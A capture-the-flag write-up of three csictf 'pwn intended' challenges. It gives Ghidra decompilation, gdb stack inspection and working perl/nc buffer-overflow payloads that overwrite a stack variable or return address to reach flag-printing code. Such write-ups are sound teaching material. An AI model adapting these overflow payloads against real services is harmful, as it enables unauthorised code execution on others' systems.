
# pwn intended 0x1

## Description

I really want to have some coffee!

```
nc chall.csivit.com 30001
```

## Analysis

Decompile with Ghidra. `main()` is very simple:

```c
undefined8 main(void)
{
  char local_38 [44];
  int local_c;
  
  local_c = 0;
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Please pour me some coffee:");
  gets(local_38);
  puts("\nThanks!\n");
  if (local_c != 0) {
    puts("Oh no, you spilled some coffee on the floor! Use the flag to clean it.");
    system("cat flag.txt");
  }
  return 0;
}
```

This is the "hello world" of buffer overflows. It accepts input via `gets()` into a `local_38` buffer that holds 44 chars, and immediately after that on the stack is `local_c` which just has to be non-zero to get the flag. All you have to do is enter 45 chars of input.

## Solution

```
kali@kali:~$ perl -e 'print "A"x45 . "\n"' | nc chall.csivit.com 30001
Please pour me some coffee:

Thanks!

Oh no, you spilled some coffee on the floor! Use the flag to clean it.
csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}
```


# pwn intended 0x2

## Description

Travelling through spacetime!

```
nc chall.csivit.com 30007
```

## Analysis

Decompile with Ghidra. `main()` is very simple:

```c
undefined8 main(void)
{
  char local_38 [44];
  int local_c;
  
  local_c = 0;
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Welcome to csictf! Where are you headed?");
  gets(local_38);
  puts("Safe Journey!");
  if (local_c == -0x35014542) {
    puts("You\'ve reached your destination, here\'s a flag!");
    system("/bin/cat flag.txt");
  }
  return 0;
}
```

This is almost identical to the previous problem, except `local_c` has to be set to `-0x35014542`, which is the same as `0xcafebabe`. Just print `0xcafebabe` 12 times to fill up `local_38` and overflow into `local_c`.

## Solution

```
kali@kali:~$ perl -e 'print "\xBE\xBA\xFE\xCA"x12 . "\n"' | nc chall.csivit.com 30007
Welcome to csictf! Where are you headed?
Safe Journey!
You've reached your destination, here's a flag!
csictf{c4n_y0u_re4lly_telep0rt?}
```


# pwn intended 0x3

## Description

Travelling through spacetime!

```
nc chall.csivit.com 30013
```

## Analysis

Decompile with Ghidra. `main()` is similar to the previous examples, but it doesn't print the flag directly:

```c
undefined8 main(void)
{
  char local_28 [32];
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Welcome to csictf! Time to teleport again.");
  gets(local_28);
  return 0;
}
```

There is another function called `flag()` that we need to get to by overwriting the return address in `main()`.

```c
void flag(void)
{
  puts("Well, that was quick. Here\'s your flag:");
  system("cat flag.txt");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Get the address of `flag()` with `objdump -d pwn-intended-0x3`:

```
00000000004011ce <flag>:
  4011ce:       55                      push   %rbp
  4011cf:       48 89 e5                mov    %rsp,%rbp
  4011d2:       48 8d 3d 5f 0e 00 00    lea    0xe5f(%rip),%rdi        # 402038 <_IO_stdin_used+0x38>
  4011d9:       e8 52 fe ff ff          callq  401030 <puts@plt>
  4011de:       48 8d 3d 7b 0e 00 00    lea    0xe7b(%rip),%rdi        # 402060 <_IO_stdin_used+0x60>
  4011e5:       e8 66 fe ff ff          callq  401050 <system@plt>
  4011ea:       bf 00 00 00 00          mov    $0x0,%edi
  4011ef:       e8 7c fe ff ff          callq  401070 <exit@plt>
  4011f4:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  4011fb:       00 00 00 
  4011fe:       66 90                   xchg   %ax,%ax
```

Let's start by filling up that 32 char buffer and see what the stack looks like.

```
kali@kali:~/Downloads$ perl -e 'print "A"x32 . "\n"' > 32chars.txt
kali@kali:~/Downloads$ gdb pwn-intended-0x3
...
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401166 <+0>:     push   rbp
   0x0000000000401167 <+1>:     mov    rbp,rsp
   0x000000000040116a <+4>:     sub    rsp,0x20
   0x000000000040116e <+8>:     mov    rax,QWORD PTR [rip+0x2eeb]        # 0x404060 <stdout@@GLIBC_2.2.5>                                                                                               
   0x0000000000401175 <+15>:    mov    esi,0x0
   0x000000000040117a <+20>:    mov    rdi,rax
   0x000000000040117d <+23>:    call   0x401040 <setbuf@plt>
   0x0000000000401182 <+28>:    mov    rax,QWORD PTR [rip+0x2ee7]        # 0x404070 <stdin@@GLIBC_2.2.5>                                                                                                
   0x0000000000401189 <+35>:    mov    esi,0x0
   0x000000000040118e <+40>:    mov    rdi,rax
   0x0000000000401191 <+43>:    call   0x401040 <setbuf@plt>
   0x0000000000401196 <+48>:    mov    rax,QWORD PTR [rip+0x2ee3]        # 0x404080 <stderr@@GLIBC_2.2.5>                                                                                               
   0x000000000040119d <+55>:    mov    esi,0x0
   0x00000000004011a2 <+60>:    mov    rdi,rax
   0x00000000004011a5 <+63>:    call   0x401040 <setbuf@plt>
   0x00000000004011aa <+68>:    lea    rdi,[rip+0xe57]        # 0x402008
   0x00000000004011b1 <+75>:    call   0x401030 <puts@plt>
   0x00000000004011b6 <+80>:    lea    rax,[rbp-0x20]
   0x00000000004011ba <+84>:    mov    rdi,rax
   0x00000000004011bd <+87>:    mov    eax,0x0
   0x00000000004011c2 <+92>:    call   0x401060 <gets@plt>
   0x00000000004011c7 <+97>:    mov    eax,0x0
   0x00000000004011cc <+102>:   leave  
   0x00000000004011cd <+103>:   ret    
End of assembler dump.
gef➤  break *0x00000000004011c7
Breakpoint 1 at 0x4011c7
```

We set a breakpoint immediately after `gets()` so we can see what's on the stack after input is accepted.

```
gef➤  run < 32chars.txt
Starting program: /home/kali/Downloads/pwn-intended-0x3 < 32chars.txt
Welcome to csictf! Time to teleport again.

Breakpoint 1, 0x00000000004011c7 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdd00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$rbx   : 0x0               
$rcx   : 0x00007ffff7fb0980  →  0x00000000fbad208b
$rdx   : 0x0               
$rsp   : 0x00007fffffffdd00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$rbp   : 0x00007fffffffdd20  →  0x0000000000401200  →  <__libc_csu_init+0> endbr64 
$rsi   : 0x00007ffff7fb0a03  →  0xfb34d0000000000a
$rdi   : 0x00007ffff7fb34d0  →  0x0000000000000000
$rip   : 0x00000000004011c7  →  <main+97> mov eax, 0x0
$r8    : 0x00007fffffffdd00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$r9    : 0x0               
$r10   : 0xfffffffffffff23d
$r11   : 0x246             
$r12   : 0x0000000000401080  →  <_start+0> endbr64 
$r13   : 0x00007fffffffde00  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdd00│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"   ← $rax, $rsp, $r8
0x00007fffffffdd08│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffdd10│+0x0010: "AAAAAAAAAAAAAAAA"
0x00007fffffffdd18│+0x0018: "AAAAAAAA"
0x00007fffffffdd20│+0x0020: 0x0000000000401200  →  <__libc_csu_init+0> endbr64   ← $rbp
0x00007fffffffdd28│+0x0028: 0x00007ffff7e1ae0b  →  <__libc_start_main+235> mov edi, eax
0x00007fffffffdd30│+0x0030: 0x00007ffff7fad618  →  0x00007ffff7e1a6f0  →  <init_cacheinfo+0> push r15
0x00007fffffffdd38│+0x0038: 0x00007fffffffde08  →  0x00007fffffffe0f2  →  "/home/kali/Downloads/pwn-intended-0x3"
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4011ba <main+84>        mov    rdi, rax
     0x4011bd <main+87>        mov    eax, 0x0
     0x4011c2 <main+92>        call   0x401060 <gets@plt>
 →   0x4011c7 <main+97>        mov    eax, 0x0
     0x4011cc <main+102>       leave  
     0x4011cd <main+103>       ret    
     0x4011ce <flag+0>         push   rbp
     0x4011cf <flag+1>         mov    rbp, rsp
     0x4011d2 <flag+4>         lea    rdi, [rip+0xe5f]        # 0x402038
─────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn-intended-0x", stopped 0x4011c7 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4011c7 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  c
Continuing.
[Inferior 1 (process 91858) exited normally]
```

That filled up `local_28` with 32 A's, and then the null terminator fell outside the buffer. It didn't crash. This looks like our current return address that we need to overwrite, since `main()` will be returning back to `__libc_start_main`:

```
0x00007fffffffdd28│+0x0028: 0x00007ffff7e1ae0b  →  <__libc_start_main+235> mov edi, eax
```

Try printing 40 chars and see if we segfault by overflowing into that address.

```
kali@kali:~/Downloads$ perl -e 'print "A"x40 . "\n"' > 40chars.txt
```

```
gef➤  run < 40chars.txt
Starting program: /home/kali/Downloads/pwn-intended-0x3 < 40chars.txt
Welcome to csictf! Time to teleport again.

Breakpoint 1, 0x00000000004011c7 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdd00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$rbx   : 0x0               
$rcx   : 0x00007ffff7fb0980  →  0x00000000fbad208b
$rdx   : 0x0               
$rsp   : 0x00007fffffffdd00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$rbp   : 0x00007fffffffdd20  →  "AAAAAAAA"
$rsi   : 0x00007ffff7fb0a03  →  0xfb34d0000000000a
$rdi   : 0x00007ffff7fb34d0  →  0x0000000000000000
$rip   : 0x00000000004011c7  →  <main+97> mov eax, 0x0
$r8    : 0x00007fffffffdd00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$r9    : 0x0               
$r10   : 0xfffffffffffff23d
$r11   : 0x246             
$r12   : 0x0000000000401080  →  <_start+0> endbr64 
$r13   : 0x00007fffffffde00  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdd00│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"   ← $rax, $rsp, $r8
0x00007fffffffdd08│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffdd10│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffdd18│+0x0018: "AAAAAAAAAAAAAAAA"
0x00007fffffffdd20│+0x0020: "AAAAAAAA"   ← $rbp
0x00007fffffffdd28│+0x0028: 0x00007ffff7e1ae00  →  <__libc_start_main+224> adc al, 0x48
0x00007fffffffdd30│+0x0030: 0x00007ffff7fad618  →  0x00007ffff7e1a6f0  →  <init_cacheinfo+0> push r15
0x00007fffffffdd38│+0x0038: 0x00007fffffffde08  →  0x00007fffffffe0f2  →  "/home/kali/Downloads/pwn-intended-0x3"
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4011ba <main+84>        mov    rdi, rax
     0x4011bd <main+87>        mov    eax, 0x0
     0x4011c2 <main+92>        call   0x401060 <gets@plt>
 →   0x4011c7 <main+97>        mov    eax, 0x0
     0x4011cc <main+102>       leave  
     0x4011cd <main+103>       ret    
     0x4011ce <flag+0>         push   rbp
     0x4011cf <flag+1>         mov    rbp, rsp
     0x4011d2 <flag+4>         lea    rdi, [rip+0xe5f]        # 0x402038
─────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn-intended-0x", stopped 0x4011c7 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4011c7 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/40wx $rsp
0x7fffffffdd00: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdd10: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdd20: 0x41414141      0x41414141      0xf7e1ae00      0x00007fff
0x7fffffffdd30: 0xf7fad618      0x00007fff      0xffffde08      0x00007fff
0x7fffffffdd40: 0xf7f7ba48      0x00000001      0x00401166      0x00000000
0x7fffffffdd50: 0x00000000      0x00000000      0x337aabb9      0xf5817c43
0x7fffffffdd60: 0x00401080      0x00000000      0xffffde00      0x00007fff
0x7fffffffdd70: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffdd80: 0xad1aabb9      0x0a7e833c      0x4cfcabb9      0x0a7e9300
0x7fffffffdd90: 0x00000000      0x00000000      0x00000000      0x00000000
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e1ae02 in __libc_start_main (main=0x401166 <main>, argc=0x1, argv=0x7fffffffde08, init=<
optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffddf8) at ../csu
/libc-start.c:308
308     ../csu/libc-start.c: No such file or directory.
```

There's our segfault. So all we have to do is print 40 chars, and then print the address we want to reach (`0x00000000004011ce` for `flag()`).

## Solution

```
kali@kali:~/Downloads$ perl -e 'print "A"x40 . "\xCE\x11\x40\x00\x00\x00\x00\x00" . "\n"' | nc chall.csivit.com 30013
Welcome to csictf! Time to teleport again.
Well, that was quick. Here's your flag:
csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
```

